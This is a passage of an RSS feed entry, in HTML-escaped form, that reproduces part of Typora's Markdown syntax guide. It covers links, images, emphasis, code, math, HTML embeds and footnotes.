&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[Google][]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;And then define the link:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[Google]: http://google.com/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In Typora, clicking the link will expand it for editing, and command+click will open the hyperlink in your web browser.&lt;/p&gt;
&lt;h3 id=&#34;urls&#34;&gt;URLs&lt;/h3&gt;
&lt;p&gt;Typora allows you to insert URLs as links, wrapped by &lt;code&gt;&amp;lt;&lt;/code&gt;brackets&lt;code&gt;&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;i@typora.io&amp;gt;&lt;/code&gt; becomes &lt;a class=&#34;link&#34; href=&#34;mailto:i@typora.io&#34; &gt;i@typora.io&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Typora will also automatically link standard URLs. e.g: &lt;a class=&#34;link&#34; href=&#34;https://www.google.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.google.com&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&#34;images&#34;&gt;Images&lt;/h3&gt;
&lt;p&gt;Images have similar syntax as links, but they require an additional &lt;code&gt;!&lt;/code&gt; char before the start of the link. The syntax for inserting an image looks like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;![&lt;span style=&#34;color:#f92672&#34;&gt;Alt text&lt;/span&gt;](&lt;span style=&#34;color:#a6e22e&#34;&gt;/path/to/img.jpg&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;![&lt;span style=&#34;color:#f92672&#34;&gt;Alt text&lt;/span&gt;](&lt;span style=&#34;color:#a6e22e&#34;&gt;/path/to/img.jpg &amp;#34;Optional title&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You are able to use drag &amp;amp; drop to insert an image from an image file or your web browser. You can modify the markdown source code by clicking on the image. A relative path will be used if the image that is added using drag &amp;amp; drop is in same directory or sub-directory as the document you&amp;rsquo;re currently editing.&lt;/p&gt;
&lt;p&gt;If you’re using markdown for building websites, you may specify a URL prefix for the image preview on your local computer with property &lt;code&gt;typora-root-url&lt;/code&gt; in YAML Front Matters. For example, input &lt;code&gt;typora-root-url:/User/Abner/Website/typora.io/&lt;/code&gt; in YAML Front Matters, and then &lt;code&gt;![alt](/blog/img/test.png)&lt;/code&gt; will be treated as &lt;code&gt;![alt](file:///User/Abner/Website/typora.io/blog/img/test.png)&lt;/code&gt; in Typora.&lt;/p&gt;
&lt;p&gt;You can find more details &lt;a class=&#34;link&#34; href=&#34;https://support.typora.io/Images/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&#34;emphasis&#34;&gt;Emphasis&lt;/h3&gt;
&lt;p&gt;Markdown treats asterisks (&lt;code&gt;*&lt;/code&gt;) and underscores (&lt;code&gt;_&lt;/code&gt;) as indicators of emphasis. Text wrapped with one &lt;code&gt;*&lt;/code&gt; or &lt;code&gt;_&lt;/code&gt; will be wrapped with an HTML &lt;code&gt;&amp;lt;em&amp;gt;&lt;/code&gt; tag. E.g:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*single asterisks*
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;_single underscores_&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;output:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;single asterisks&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;single underscores&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;GFM will ignore underscores in words, which is commonly used in code and names, like this:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;wow_great_stuff&lt;/p&gt;
&lt;p&gt;do_this_and_do_that_and_another_thing.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;To produce a literal asterisk or underscore at a position where it would otherwise be used as an emphasis delimiter, you can backslash escape it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\*this text is surrounded by literal asterisks\*
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Typora recommends using the &lt;code&gt;*&lt;/code&gt; symbol.&lt;/p&gt;
&lt;h3 id=&#34;strong&#34;&gt;Strong&lt;/h3&gt;
&lt;p&gt;A double &lt;code&gt;*&lt;/code&gt; or &lt;code&gt;_&lt;/code&gt; will cause its enclosed contents to be wrapped with an HTML &lt;code&gt;&amp;lt;strong&amp;gt;&lt;/code&gt; tag, e.g:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;**double asterisks**
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;font-weight:bold&#34;&gt;__double underscores__&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;output:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;double asterisks&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;double underscores&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Typora recommends using the &lt;code&gt;**&lt;/code&gt; symbol.&lt;/p&gt;
&lt;h3 id=&#34;code&#34;&gt;Code&lt;/h3&gt;
&lt;p&gt;To indicate an inline span of code, wrap it with backtick quotes (`). Unlike a pre-formatted code block, a code span indicates code within a normal paragraph. For example:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Use the &lt;span style=&#34;color:#e6db74&#34;&gt;`printf()`&lt;/span&gt; function.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;will produce:&lt;/p&gt;
&lt;p&gt;Use the &lt;code&gt;printf()&lt;/code&gt; function.&lt;/p&gt;
&lt;h3 id=&#34;strikethrough&#34;&gt;Strikethrough&lt;/h3&gt;
&lt;p&gt;GFM adds syntax to create strikethrough text, which is missing from standard Markdown.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;~~Mistaken text.~~&lt;/code&gt; becomes &lt;del&gt;Mistaken text.&lt;/del&gt;&lt;/p&gt;
&lt;h3 id=&#34;underlines&#34;&gt;Underlines&lt;/h3&gt;
&lt;p&gt;Underline is powered by raw HTML.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;u&amp;gt;Underline&amp;lt;/u&amp;gt;&lt;/code&gt; becomes &lt;u&gt;Underline&lt;/u&gt;.&lt;/p&gt;
&lt;h3 id=&#34;emoji-smile&#34;&gt;Emoji :smile:&lt;/h3&gt;
&lt;p&gt;Input emoji with syntax &lt;code&gt;:smile:&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;User can trigger auto-complete suggestions for emoji by pressing &lt;code&gt;ESC&lt;/code&gt; key, or trigger it automatically after enabling it on preference panel. Also, inputting UTF-8 emoji characters directly is also supported by going to &lt;code&gt;Edit&lt;/code&gt; -&amp;gt; &lt;code&gt;Emoji &amp;amp; Symbols&lt;/code&gt; in the menu bar (macOS).&lt;/p&gt;
&lt;h3 id=&#34;inline-math&#34;&gt;Inline Math&lt;/h3&gt;
&lt;p&gt;To use this feature, please enable it first in the &lt;code&gt;Preference&lt;/code&gt; Panel -&amp;gt; &lt;code&gt;Markdown&lt;/code&gt; Tab. Then, use &lt;code&gt;$&lt;/code&gt; to wrap a TeX command. For example: &lt;code&gt;$\lim_{x \to \infty} \exp(-x) = 0$&lt;/code&gt; will be rendered as LaTeX command.&lt;/p&gt;
&lt;p&gt;To trigger inline preview for inline math: input “$”, then press the &lt;code&gt;ESC&lt;/code&gt; key, then input a TeX command.&lt;/p&gt;
&lt;p&gt;You can find more details &lt;a class=&#34;link&#34; href=&#34;https://support.typora.io/Math/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&#34;subscript&#34;&gt;Subscript&lt;/h3&gt;
&lt;p&gt;To use this feature, please enable it first in the &lt;code&gt;Preference&lt;/code&gt; Panel -&amp;gt; &lt;code&gt;Markdown&lt;/code&gt; Tab. Then, use &lt;code&gt;~&lt;/code&gt; to wrap subscript content. For example: &lt;code&gt;H~2~O&lt;/code&gt;, &lt;code&gt;X~long\ text~&lt;/code&gt;/&lt;/p&gt;
&lt;h3 id=&#34;superscript&#34;&gt;Superscript&lt;/h3&gt;
&lt;p&gt;To use this feature, please enable it first in the &lt;code&gt;Preference&lt;/code&gt; Panel -&amp;gt; &lt;code&gt;Markdown&lt;/code&gt; Tab. Then, use &lt;code&gt;^&lt;/code&gt; to wrap superscript content. For example: &lt;code&gt;X^2^&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;highlight&#34;&gt;Highlight&lt;/h3&gt;
&lt;p&gt;To use this feature, please enable it first in the &lt;code&gt;Preference&lt;/code&gt; Panel -&amp;gt; &lt;code&gt;Markdown&lt;/code&gt; Tab. Then, use &lt;code&gt;==&lt;/code&gt; to wrap highlight content. For example: &lt;code&gt;==highlight==&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;html&#34;&gt;HTML&lt;/h2&gt;
&lt;p&gt;You can use HTML to style content what pure Markdown does not support. For example, use &lt;code&gt;&amp;lt;span style=&amp;quot;color:red&amp;quot;&amp;gt;this text is red&amp;lt;/span&amp;gt;&lt;/code&gt; to add text with red color.&lt;/p&gt;
&lt;h3 id=&#34;embed-contents&#34;&gt;Embed Contents&lt;/h3&gt;
&lt;p&gt;Some websites provide iframe-based embed code which you can also paste into Typora. For example:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Markdown&#34; data-lang=&#34;Markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;iframe&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;height&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;265&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;scrolling&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Fancy Animated SVG Menu&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://codepen.io/jeangontijo/embed/OxVywj/?height=265&amp;amp;theme-id=0&amp;amp;default-tab=css,result&amp;amp;embed-version=2&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;frameborder&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allowtransparency&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;true&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allowfullscreen&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;true&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;width: 100%;&amp;#39;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;iframe&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;video&#34;&gt;Video&lt;/h3&gt;
&lt;p&gt;You can use the &lt;code&gt;&amp;lt;video&amp;gt;&lt;/code&gt; HTML tag to embed videos. For example:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Markdown&#34; data-lang=&#34;Markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;video&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xxx.mp4&amp;#34;&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;other-html-support&#34;&gt;Other HTML Support&lt;/h3&gt;
&lt;p&gt;You can find more details &lt;a class=&#34;link&#34; href=&#34;https://support.typora.io/HTML/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr /&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;Here is the &lt;em&gt;text&lt;/em&gt; of the &lt;strong&gt;footnote&lt;/strong&gt;.&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
</description>
        </item>
        
    </channel>
</rss>
